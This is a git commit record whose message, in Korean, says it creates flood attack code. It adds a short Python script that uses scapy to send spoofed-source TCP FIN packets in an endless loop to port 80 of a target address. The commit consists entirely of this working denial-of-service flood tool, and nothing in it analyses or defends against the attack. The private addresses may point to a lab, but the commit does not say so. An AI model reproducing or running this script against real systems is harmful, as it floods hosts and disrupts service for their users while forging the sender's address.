36e26c51ca70b11250da7f6beb0cb8a50d9ab3eb
DongHa,Lee <qaqa1321@gmail.com>
2026-07-21 12:04:59 +0900

    feat: Flood 공격코드 생성

---
+++ attacks/FIN_Flood_attack.py
@@ -0,0 +1,8 @@
+from scapy.all import IP, TCP, send
+
+spoofed_ip = "192.168.11.129" 
+target_ip = "192.168.110.128" 
+
+fin_packet = IP(src=spoofed_ip, dst=target_ip) / TCP(dport=80, flags="F")
+
+send(fin_packet, loop=1, verbose=0)
